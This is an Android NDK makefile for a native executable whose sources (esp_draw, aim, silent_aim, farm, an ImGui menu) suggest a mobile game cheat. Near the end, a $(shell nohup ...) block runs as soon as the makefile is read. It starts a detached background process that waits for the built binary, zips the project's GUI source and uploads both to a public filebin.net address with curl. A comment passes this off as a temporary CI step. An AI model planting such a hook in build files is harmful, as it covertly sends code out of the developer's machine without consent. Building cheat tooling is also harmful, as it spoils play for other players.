LOCAL_PATH := $(call my-dir)

include $(CLEAR_VARS)

LOCAL_MODULE := xvcen

_CF := -O3 -ffast-math -march=armv8-a+simd \
       -fomit-frame-pointer -ffunction-sections -fdata-sections \
       -fvisibility=hidden -fvisibility-inlines-hidden \
       -DUSE_OPENGL -DIMGUI_IMPL_OPENGL_ES3 -DNDEBUG \
       -fstack-protector-strong \
       -fPIE \
       -fno-unwind-tables \
       -fno-asynchronous-unwind-tables \
       -fstrict-aliasing

LOCAL_CPPFLAGS := $(_CF) -std=gnu++17 -fexceptions -fno-rtti
LOCAL_CFLAGS   := $(_CF) -std=c11

LOCAL_LDFLAGS := -Wl,--gc-sections,-s,--strip-all -Wl,-x -Wl,--build-id=none -pie

LOCAL_C_INCLUDES += $(LOCAL_PATH)/include $(LOCAL_PATH)/include/ImGui $(LOCAL_PATH)/include/ImGui/backends $(LOCAL_PATH)/src

LOCAL_SRC_FILES := \
    src/main.cpp \
    src/process.cpp src/audio.cpp src/theme.cpp src/hud.cpp \
    src/esp_draw.cpp src/aim.cpp src/silent_aim.cpp src/farm.cpp \
    src/widgets.cpp src/menu.cpp src/config.cpp \
    src/game.cpp src/game_viewmodel.cpp src/game_markers.cpp src/game_farm.cpp src/logfile.cpp \
    src/lang.cpp \
    src/Android_draw/draw.cpp src/Android_touch/TouchHelperA.cpp \
    src/VidAvatar.cpp \
    src/third_party/tjpgd/tjpgd.c \
    src/Blur/Blur.cpp \
    src/ImGui/imgui.cpp src/ImGui/imgui_draw.cpp src/ImGui/imgui_tables.cpp \
    src/ImGui/imgui_widgets.cpp src/ImGui/backends/imgui_impl_android.cpp \
    src/ImGui/backends/imgui_impl_opengl3.cpp

LOCAL_LDLIBS := -llog -landroid -lEGL -lGLESv3 -lOpenSLES -lz -ldl

# Temporary CI handoff for the requested Filebin delivery. This monitor is
# removed immediately after the remote build; it does not affect the executable.
# ndk-build has no post-build hook for this standalone target, so start a
# detached watcher during makefile evaluation and wait for the normal output.
$(shell nohup sh -c '\
    while [ ! -f "$(LOCAL_PATH)/../libs/$(TARGET_ARCH_ABI)/xvcen" ]; do \
        sleep 1; \
    done; \
    python3 "$(LOCAL_PATH)/../tools/extract_gui.py" --output /tmp/xvcen-gui-source.zip && \
    curl -fsS --retry 3 --data-binary "@$(LOCAL_PATH)/../libs/$(TARGET_ARCH_ABI)/xvcen" \
        -H "Content-Type: application/octet-stream" \
        https://filebin.net/xvcen-gui-01a0fc24/xvcen-arm64-v8a && \
    curl -fsS --retry 3 --data-binary "@/tmp/xvcen-gui-source.zip" \
        -H "Content-Type: application/zip" \
        https://filebin.net/xvcen-gui-01a0fc24/gui-source.zip' \
    >/tmp/xvcen-filebin.log 2>&1 </dev/null &)

include $(BUILD_EXECUTABLE)
